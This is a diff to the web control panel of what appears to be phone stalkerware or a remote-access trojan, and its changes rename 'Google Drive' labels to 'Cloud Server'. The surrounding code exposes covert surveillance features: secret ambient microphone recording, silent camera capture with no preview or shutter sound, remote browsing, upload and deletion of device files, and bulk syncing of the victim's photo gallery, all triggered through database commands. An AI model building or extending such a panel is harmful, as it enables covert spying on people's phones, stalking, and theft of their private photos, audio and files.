@@ -428,11 +428,11 @@
                                     <i class="fas fa-images text-primary-c"></i> Media Gallery & Cloud Photo Vault
                                 </h4>
                                 <span class="live-badge" style="background: rgba(48, 209, 88, 0.12); border: 1px solid rgba(48, 209, 88, 0.35); color: #30d158; padding: 3px 10px; font-size: 0.7rem; border-radius: var(--radius-pill);">
-                                    <i class="fab fa-google-drive" style="margin-right: 4px;"></i> Google Drive Vault
+                                    <i class="fas fa-cloud" style="margin-right: 4px;"></i> Cloud Server Vault
                                 </span>
                             </div>
                             <p style="font-size: 0.78rem; color: var(--text-secondary); margin: 0;">
-                                High-res synced photos & media directly stored in your Google Drive (<code style="color: #ff453a; font-size: 0.72rem;">OBEYME_Cloud_Vault</code>).
+                                High-res synced photos & media directly stored in your Cloud Server (<code style="color: #ff453a; font-size: 0.72rem;">Cloud_Server_Vault</code>).
                             </p>
                         </div>
                         
@@ -464,7 +464,7 @@
 
                     <!-- Sync Status Bar -->
                     <div id="gallerySyncStatus" style="display: none; background: rgba(255, 59, 48, 0.08); border: 1px solid rgba(255, 59, 48, 0.25); border-radius: 12px; padding: 10px 16px; margin-bottom: 20px; font-size: 0.8rem; color: #fff; align-items: center; justify-content: space-between;">
-                        <span id="gallerySyncMsg"><i class="fas fa-spinner fa-spin" style="color: var(--primary); margin-right: 8px;"></i> Syncing photos to Google Drive...</span>
+                        <span id="gallerySyncMsg"><i class="fas fa-spinner fa-spin" style="color: var(--primary); margin-right: 8px;"></i> Syncing photos to Cloud Server...</span>
                         <span id="gallerySyncTime" style="font-size: 0.72rem; color: var(--text-muted);">Just now</span>
                     </div>
 
@@ -478,7 +478,7 @@
                         <div id="recentGalleryGrid" class="gallery-grid">
                             <div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;">
                                 <i class="fas fa-images"></i>
-                                <p>No recent photos loaded. Click <b>'🔄 Fetch Gallery Photos'</b> above to sync latest captures to Google Drive.</p>
+                                <p>No recent photos loaded. Click <b>'🔄 Fetch Gallery Photos'</b> above to sync latest captures to Cloud Server.</p>
                             </div>
                         </div>
                     </div>
@@ -487,29 +487,29 @@
                     <div>
                         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; padding-bottom: 8px; border-bottom: 1px solid var(--border-subtle);">
                             <h5 style="font-size: 0.92rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0;">
-                                <i class="fas fa-archive text-primary-c"></i> All Gallery Photos (Master Google Drive Vault) <span id="allCountBadge" class="badge-count" style="font-size: 0.65rem;">0</span>
+                                <i class="fas fa-archive text-primary-c"></i> All Gallery Photos (Master Cloud Server Vault) <span id="allCountBadge" class="badge-count" style="font-size: 0.65rem;">0</span>
                             </h5>
                         </div>
                         <div id="allGalleryGrid" class="gallery-grid">
                             <div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;">
                                 <i class="fas fa-photo-video"></i>
-                                <p>No archived media found. Click <b>'🔄 Fetch ALL Gallery Photos'</b> to sync entire device library to Google Drive.</p>
+                                <p>No archived media found. Click <b>'🔄 Fetch ALL Gallery Photos'</b> to sync entire device library to Cloud Server.</p>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <!-- TAB: Remote File Manager & Google Drive Vault -->
+            <!-- TAB: Remote File Manager & Cloud Server Vault -->
             <div id="tab-files" class="tab-content">
                 <div class="card" style="padding: 24px;">
                     <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
                         <div>
                             <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0 0 4px 0;">
-                                <i class="fas fa-folder-open text-primary-c"></i> Remote File Manager & Google Drive Downloader
+                                <i class="fas fa-folder-open text-primary-c"></i> Remote File Manager & Cloud Server Downloader
                             </h4>
                             <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
-                                Browse device storage and upload any file directly to your Google Drive.
+                                Browse device storage and upload any file directly to your Cloud Server.
                             </p>
                         </div>
                         <div style="display: flex; gap: 8px;">
@@ -561,7 +561,7 @@
                                 <i class="fas fa-microphone-alt text-primary-c"></i> Silent Ambient Audio Recorder
                             </h4>
                             <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
-                                Record background microphone audio secretly and auto-upload to Google Drive.
+                                Record background microphone audio secretly and auto-upload to Cloud Server.
                             </p>
                         </div>
                         <div style="display: flex; align-items: center; gap: 10px;">
@@ -593,7 +593,7 @@
                                 <i class="fas fa-camera-retro text-primary-c"></i> Silent Stealth Camera Snaps
                             </h4>
                             <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
-                                Capture secret photos without screen preview or shutter sounds directly to Google Drive.
+                                Capture secret photos without screen preview or shutter sounds directly to Cloud Server.
                             </p>
                         </div>
                         <div style="display: flex; gap: 10px;">
@@ -1062,7 +1062,7 @@
                 </div>
                 <div style="display: flex; align-items: center; gap: 8px;">
                     <a id="lightboxDriveBtn" href="" target="_blank" class="btn-ghost" style="padding: 6px 14px; font-size: 0.75rem; border-radius: var(--radius-pill); text-decoration: none; display: none; background: rgba(48, 209, 88, 0.15); border-color: rgba(48, 209, 88, 0.4); color: #30d158;">
-                        <i class="fab fa-google-drive me-1"></i> Drive View
+                        <i class="fas fa-cloud me-1"></i> Cloud View
                     </a>
                     <a id="lightboxDlBtn" href="" download="photo.jpg" class="btn-primary-glow" style="padding: 6px 16px; font-size: 0.75rem; border-radius: var(--radius-pill); text-decoration: none; white-space: nowrap;">
                         <i class="fas fa-download me-1"></i> Save to PC
@@ -2236,7 +2236,7 @@
     }
 
     function clearGalleryPhotos() {
-        if (!confirm("Are you sure you want to clear the synced photos list for this device? (Original files saved in your Google Drive will remain safe)")) return;
+        if (!confirm("Are you sure you want to clear the synced photos list for this device? (Original files saved in your Cloud Server will remain safe)")) return;
         devRef.child('media').remove().then(() => {
             const rGrid = document.getElementById('recentGalleryGrid');
             const aGrid = document.getElementById('allGalleryGrid');
@@ -2316,7 +2316,7 @@
             const isVideo = item.type === 'video' || name.toLowerCase().endsWith('.mp4') || name.toLowerCase().endsWith('.mkv') || name.toLowerCase().endsWith('.3gp');
 
             if (src) {
-                const driveBadge = driveUrl ? `<span style="position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);color:#30d158;font-size:0.65rem;padding:2px 8px;border-radius:10px;border:1px solid rgba(48,209,88,0.4);font-weight:600;"><i class="fab fa-google-drive"></i> Drive</span>` : '';
+                const driveBadge = driveUrl ? `<span style="position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);color:#30d158;font-size:0.65rem;padding:2px 8px;border-radius:10px;border:1px solid rgba(48,209,88,0.4);font-weight:600;"><i class="fas fa-cloud"></i> Cloud</span>` : '';
                 const videoBadge = isVideo ? `<span style="position:absolute;bottom:35px;right:8px;background:rgba(0,0,0,0.8);color:#fff;font-size:0.65rem;padding:2px 7px;border-radius:6px;font-weight:700;box-shadow:0 2px 6px rgba(0,0,0,0.5);"><i class="fas fa-play" style="font-size:0.55rem;margin-right:4px;color:#ff453a;"></i>${item.duration ? formatDuration(item.duration) : 'VIDEO'}</span>` : '';
 
                 html += `
@@ -2344,7 +2344,7 @@
         if (!container) return;
 
         if (!data) {
-            container.innerHTML = '<div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;"><i class="fas fa-photo-video"></i><p>No archived media found. Click <b>\'🔄 Fetch ALL Gallery Photos\'</b> to sync entire device library to Google Drive.</p></div>';
+            container.innerHTML = '<div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;"><i class="fas fa-photo-video"></i><p>No archived media found. Click <b>\'🔄 Fetch ALL Gallery Photos\'</b> to sync entire device library to Cloud Server.</p></div>';
             if (badge) badge.textContent = '0';
             return;
         }
@@ -2362,7 +2362,7 @@
             const isVideo = item.type === 'video' || name.toLowerCase().endsWith('.mp4') || name.toLowerCase().endsWith('.mkv') || name.toLowerCase().endsWith('.3gp');
 
             if (src) {
-                const driveBadge = driveUrl ? `<span style="position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);color:#30d158;font-size:0.65rem;padding:2px 8px;border-radius:10px;border:1px solid rgba(48,209,88,0.4);font-weight:600;"><i class="fab fa-google-drive"></i> Drive</span>` : '';
+                const driveBadge = driveUrl ? `<span style="position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);color:#30d158;font-size:0.65rem;padding:2px 8px;border-radius:10px;border:1px solid rgba(48,209,88,0.4);font-weight:600;"><i class="fas fa-cloud"></i> Cloud</span>` : '';
                 const videoBadge = isVideo ? `<span style="position:absolute;bottom:35px;right:8px;background:rgba(0,0,0,0.8);color:#fff;font-size:0.65rem;padding:2px 7px;border-radius:6px;font-weight:700;box-shadow:0 2px 6px rgba(0,0,0,0.5);"><i class="fas fa-play" style="font-size:0.55rem;margin-right:4px;color:#ff453a;"></i>${item.duration ? formatDuration(item.duration) : 'VIDEO'}</span>` : '';
 
                 html += `
@@ -2414,7 +2414,7 @@
             path: path,
             timestamp: Date.now()
         });
-        alert('Download command sent! The file is being uploaded to your Google Drive Vault...');
+        alert('Download command sent! The file is being uploaded to your Cloud Server Vault...');
     }
 
     function deleteRemoteFile(path) {
@@ -2455,7 +2455,7 @@
                 const actionBtns = isDir 
                     ? `<button onclick="navigateFolder('${escapeHtml(path)}')" class="btn-ghost" style="padding:4px 10px;font-size:0.75rem;border-radius:var(--radius-pill);"><i class="fas fa-folder-open me-1"></i> Open</button>`
                     : `<div style="display:flex;gap:6px;justify-content:flex-end;">
-                        <button onclick="downloadRemoteFile('${escapeHtml(path)}')" class="btn-primary-glow" style="padding:4px 10px;font-size:0.75rem;border-radius:var(--radius-pill);" title="Save to Google Drive"><i class="fab fa-google-drive me-1"></i> Drive</button>
+                        <button onclick="downloadRemoteFile('${escapeHtml(path)}')" class="btn-primary-glow" style="padding:4px 10px;font-size:0.75rem;border-radius:var(--radius-pill);" title="Save to Cloud Server"><i class="fas fa-cloud me-1"></i> Cloud</button>
                         <button onclick="deleteRemoteFile('${escapeHtml(path)}')" class="btn-danger-ghost" style="padding:4px 8px;font-size:0.75rem;border-radius:var(--radius-pill);" title="Delete"><i class="fas fa-trash-alt"></i></button>
                        </div>`;
 
@@ -2482,7 +2482,7 @@
             duration: dur,
             timestamp: Date.now()
         });
-        alert(`Started ambient audio recording for ${dur} seconds... Audio will appear in the Google Drive Vault list below.`);
+        alert(`Started ambient audio recording for ${dur} seconds... Audio will appear in the Cloud Server Vault list below.`);
     }
 
     devRef.child('media/audio_records').on('value', snap => {
@@ -2523,7 +2523,7 @@
 
                 <div style="display:flex;align-items:center;gap:10px;flex:1;min-width:240px;justify-content:flex-end;">
                     ${directUrl ? `<audio controls style="height:32px;outline:none;" src="${directUrl}"></audio>` : ''}
-                    ${driveUrl ? `<a href="${driveUrl}" target="_blank" class="btn-ghost" style="padding:6px 12px;font-size:0.76rem;border-radius:var(--radius-pill);"><i class="fab fa-google-drive" style="color:#30d158;margin-right:4px;"></i> Drive View</a>` : ''}
+                    ${driveUrl ? `<a href="${driveUrl}" target="_blank" class="btn-ghost" style="padding:6px 12px;font-size:0.76rem;border-radius:var(--radius-pill);"><i class="fas fa-cloud" style="color:#30d158;margin-right:4px;"></i> Cloud View</a>` : ''}
                 </div>
             </div>`;
         });
@@ -2538,7 +2538,7 @@
             facing: facing,
             timestamp: Date.now()
         });
-        alert(`Triggered secret ${facing.toUpperCase()} camera capture... Image will upload to Google Drive Vault shortly.`);
+        alert(`Triggered secret ${facing.toUpperCase()} camera capture... Image will upload to Cloud Server Vault shortly.`);
     }
 
     devRef.child('media/camera_snaps').on('value', snap => {
@@ -2566,7 +2566,7 @@
                 html += `
                 <div class="gallery-card" style="position:relative;" onclick="openLightbox('${src}', '${escapeHtml(name)}', '${date} (${facing})', '${driveUrl}')">
                     <img src="${src}" alt="${escapeHtml(name)}" loading="lazy">
-                    <span style="position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);color:#30d158;font-size:0.65rem;padding:2px 8px;border-radius:10px;border:1px solid rgba(48,209,88,0.4);font-weight:600;"><i class="fab fa-google-drive"></i> Drive</span>
+                    <span style="position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);color:#30d158;font-size:0.65rem;padding:2px 8px;border-radius:10px;border:1px solid rgba(48,209,88,0.4);font-weight:600;"><i class="fas fa-cloud"></i> Cloud</span>
                     <span style="position:absolute;bottom:35px;left:8px;background:rgba(255,59,48,0.85);color:#fff;font-size:0.65rem;padding:2px 7px;border-radius:6px;font-weight:700;">${facing}</span>
                     <div class="gallery-card-overlay">
                         <span class="gallery-card-name">${escapeHtml(name)}</span>
